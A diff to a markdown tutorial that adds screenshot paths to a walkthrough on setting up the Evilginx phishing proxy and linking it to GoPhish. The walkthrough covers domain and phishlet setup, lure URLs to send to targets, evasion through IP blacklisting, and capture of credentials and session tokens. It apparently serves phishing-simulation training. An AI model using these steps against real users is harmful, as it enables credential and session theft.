@@ -719,7 +719,7 @@ go build
 
 > Do not interrupt the build, as it may take a few seconds to complete.  
 
-![](assets/)
+![](assets/83-evilginx-installation.png)
 
 To install Evilginx using its [binary](https://github.com/kgretzky/evilginx2/releases/latest), follow these steps:  
 
@@ -727,13 +727,13 @@ To install Evilginx using its [binary](https://github.com/kgretzky/evilginx2/rel
 wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip
 ```
 
-![](assets/)
+![](assets/84-downloading-evilginx.png)
 
 ```bash
 unzip evilginx-v3.3.0-linux-64bit.zip -d evilginx
 ```
 
-![](assets/)
+![](assets/85-unziping-evilginx.png)
 
 After that, give `evilginx` execution permissions:  
 
@@ -741,7 +741,7 @@ After that, give `evilginx` execution permissions:
 chmod +x ./evilginx
 ```
 
-![](assets/)
+![](assets/86-adding-execution-permission-to-evilginx.png)
 
 Once done, launch `evilginx`:  
 
@@ -749,7 +749,7 @@ Once done, launch `evilginx`:
 ./evilginx
 ```
 
-![](assets/)
+![](assets/86-executing-evilginx.png)
 
 As you can see, Evilginx failed to start a DNS server on `port 53`. This occured because the port is being used by another process on the system. To check it, use this command:  
 
@@ -757,7 +757,7 @@ As you can see, Evilginx failed to start a DNS server on `port 53`. This occured
 sudo lsof -i :53
 ```
 
-![](assets/)
+![](assets/87-displaying-listening-sockets.png)
 
 To deal with that, you will first need to stop the `systemd-resolved` service, then remove the `/etc/resolv.conf` file:  
 
@@ -769,13 +769,13 @@ sudo systemctl stop systemd-resolved.service
 lsof -i :53
 ```
 
-![](assets/)
+![](assets/88-stopping-dns-resolution-daemon.png)
 
 ```bash
 mv /etc/resolv.conf /etc/resolv.conf.bak
 ```
 
-![](assets/)
+![](assets/89-creating-backup-of-dns-configuration.png)
 
 After that, execute the following command to create a new `/etc/resolv.conf` with your favorite recursive DNS servers:  
 
@@ -783,7 +783,7 @@ After that, execute the following command to create a new `/etc/resolv.conf` wit
 echo -e 'nameserver 1.1.1.1\nnameserver 9.9.9.9' >> /etc/resolv.conf
 ```
 
-![](assets/)
+![](assets/90-creating-a-new-dns-configuration.png)
 
 To check if the DNS resolution works, you can perform an `nslookup`:  
 
@@ -791,11 +791,11 @@ To check if the DNS resolution works, you can perform an `nslookup`:
 nslookup google.com
 ```
 
-![](assets/)
+![](assets/91-testing-dns-configuration.png)
 
 See that Evilginx uses port `tcp/443` to host your phishing website, you will need to reconfigure your GoPhish's phishing server URL to listen on another port (eg: tcp/8843).  
 
-![](assets/)
+![](assets/92-changing-gophish-phishing-server-url.png)
 
 After that, restart your Gophish service to apply the changes:  
 
@@ -807,7 +807,7 @@ systemctl restart gophish
 systemctl status gophish
 ```
 
-![](assets/)
+![](assets/93-restarting-gophish-service-to-apply-changes.png)
 
 Let's now configure the domain, and the external IPv4 address:  
 
@@ -815,17 +815,17 @@ Let's now configure the domain, and the external IPv4 address:
 config domain <your_phishing_domain_name>
 ```
 
-![](assets/)
+![](assets/94-evilginx-domain-configuration.png)
 
 ```
 config ipv4 external <your_phishing_domain_ipv4_address>
 ```
 
-![](assets/)
+![](assets/95-evilginx-external-ip-configuration.png)
 
 Enter the `Help` command to get some help:  
 
-![](assets/)
+![](assets/96-evilginx-help-menu.png)
 
 In the next section, we will learn how to configure phishlets.  
 
@@ -841,7 +841,7 @@ cd phishlets/
 cat example.yaml
 ```
 
-![](assets/)
+![](assets/97-evilginx-phishlets.png)
 
 Refer to the command below to download more phishlets [here](https://github.com/An0nUD4Y/Evilginx-Phishlets).  
 
@@ -849,17 +849,15 @@ Refer to the command below to download more phishlets [here](https://github.com/
 git clone https://github.com/An0nUD4Y/Evilginx-Phishlets.git
 ```
 
-![](assets/)
+![](assets/98-cloning-evilginx-phishlets.png)
 
 > Note that you can also create your own [phishlets](https://help.evilginx.com/pro/phishlets/) if you want to.  
 
-![](assets/)
-
 Let's use the `wordpress.org.yaml` phishlet to better understand the structure of a phishlet:  
 
-![](assets/)
+![](assets/99-wordpress-phishlet1.png)
 
-![](assets/)
+![](assets/100-wordpress-phishlet2.png)
 
 Here is a quick explanation of the different fields in the yaml file:  
 
@@ -874,7 +872,7 @@ After that, add the highlighted subdomains (login, make, profiles) above to your
 
 Make sure, your phishlet is located in the `phishlets` directory, otherwise it won't be found by Evilginx:  
 
-![](assets/)
+![](assets/101-evilginx-phishlets-directory.png)
 
 Once done, re-execute `evilginx`:  
 
@@ -882,7 +880,7 @@ Once done, re-execute `evilginx`:
 ./evilginx
 ```
 
-![](assets/)
+![](assets/102-reexecuting-evilginx-.png)
 
 To better understand how to use the `phishlets`, use this command:  
 
@@ -890,7 +888,7 @@ To better understand how to use the `phishlets`, use this command:
 help phishlets
 ```
 
-![](assets/)
+![](assets/103-evilginx-phishlets-help.png)
 
 To hide the **example** phishlet, use this command:  
 
@@ -898,7 +896,7 @@ To hide the **example** phishlet, use this command:
 phishlets hide example
 ```
 
-![](assets/)
+![](assets/104-evilginx-hide-phishlets.png)
 
 To enable `wordpress.org` phishlet and request an SSL/TLS certificate, use the following command:  
 
@@ -906,7 +904,7 @@ To enable `wordpress.org` phishlet and request an SSL/TLS certificate, use the f
 phishlets enable wordpress.org
 ```
 
-![](assets/)
+![](assets/105-evilginx-enable-phishlets.png)
 
 This returned an error stating that `wordpress.org` phishlet requires its hostname to be set up.  
 
@@ -916,9 +914,9 @@ To fix that, use this command:
 phishlets hostname wordpress.org <your_phishing_domain>
 ```
 
-![](assets/)
+![](assets/105-evilginx-hostname-configuration.png)
 
-![](assets/)
+![](assets/106-evilginx-hostname-configuration2.png)
 
 After that, enable the phishlet:  
 
@@ -926,21 +924,17 @@ After that, enable the phishlet:
 phishlets enable wordpress.org
 ```
 
-![](assets/)
+![](assets/107-enabling-phishlet.png)
 
-![](assets/)
+![](assets/108-phishlet-enabled.png)
 
 In my case, it worked. However, you may come across this error when enabling your phishlet:
 
-![](assets/)
+![](assets/109-phishlet-enabling-common-error.png)
 
 To fix that, you will need to add the `_acme_challenge` TXT record with the value returned by Evilginx.  
 
-![](assets/)
-
-![](assets/)
-
-![](assets/)
+![](assets/110-fixing-phishlet-enabling-common-error.png)
 
 Here is a little trick to disable log output for blacklist messages:  
 
@@ -948,7 +942,7 @@ Here is a little trick to disable log output for blacklist messages:
 blacklist log off
 ```
 
-![](assets/)
+![](assets/111-disabling-blacklisted-ips-logging.png)
 
 This tells Evilginx to stop showing warnings regarding blacklisted IP addresses.  
 Let's now generate our phishing link using lures.  
@@ -961,7 +955,7 @@ Let's now generate our phishing link using lures.
 help lures
 ```
 
-![](assets/)
+![](assets/112-evilginx-lures-help.png)
 
 
 To create a lure for your `wordpress.org` phishlet, use this command:  
@@ -970,9 +964,7 @@ To create a lure for your `wordpress.org` phishlet, use this command:
 lures create wordpress.org
 ```
 
-![](assets/)
-
-![](assets/)
+![](assets/113-creating-a-new-lure.png)
 
 To get the lure's URL, use this command:  
 
@@ -980,7 +972,7 @@ To get the lure's URL, use this command:
 lures get-url 0
 ```
 
-![](assets/)
+![](assets/114-getting-lure-url.png)
 
 This is the link you will send to your targets.  
 
@@ -990,7 +982,7 @@ To display all lures, run this command:
 lures
 ```
 
-![](assets/)
+![](assets/115-displaying-all-lures.png)
 
 > Note that IP addresses will automatically be blacklisted by Evilginx when a user tries to access your phishing website without specifying the lure. This prevents unauthorized access and make detection harder.  
 
@@ -1000,13 +992,13 @@ lures
 
 To start, let's copy our lure's URL and open it in our browser:    
 
-![](assets/)
+![](assets/116-evilginx-sessions.png)
 
 As you can see, I landed on a Wordpress login page.  
 
 Let's now try to enter some credentials on your Wordpress phishing website:  
 
-![](assets/)
+![](assets/117-credentials-harvesting.png)
 
 To check if Evilginx captured the credentials, use this command:  
 
@@ -1025,29 +1017,29 @@ One of the main differences between GoPhish and Evilginx is that GoPhish is a **
 To combine GoPhish and Evilginx, create a new campaign and replace the `URL` section in GoPhish `Campaigns` with your Evilginx's lure URL, then launch your campaign.  
 Here is my lure:  
 
-![](assets/)
+![](assets/118-displaying-lure-url.png)
 
 Replacing it gave me something like this:  
 
-![](assets/)
+![](assets/119-entering-evilginx-lure-url-in-gophish-landing-page-url.png)
 
 Once done, I save my settings and launch the campaign.  
 
 When taking a look at the Campaign dashboard, we can see that the email was successfully sent.  
 
-![](assets/)
+![](assets/120-launching-evilginx-gophish-campaign.png)
 
 To verify that we can check the target's email inbox:  
 
-![](assets/)
+![](assets/121-checking-target-mailbox.png)
 
 Let's click on the link in the email:  
 
-![](assets/)
+![](assets/122-open-the-phishing-url-in-a-new-tab.png)
 
 As you can notice, Evilginx captures the target's session. 
 
-![](assets/)
+![](assets/123-displaying-sessions.png)
 
 If you're curious to learn more about how to combine Evilginx and GoPhish, refer to [Evilgophish](https://github.com/fin3ss3g0d/evilgophish).  
 
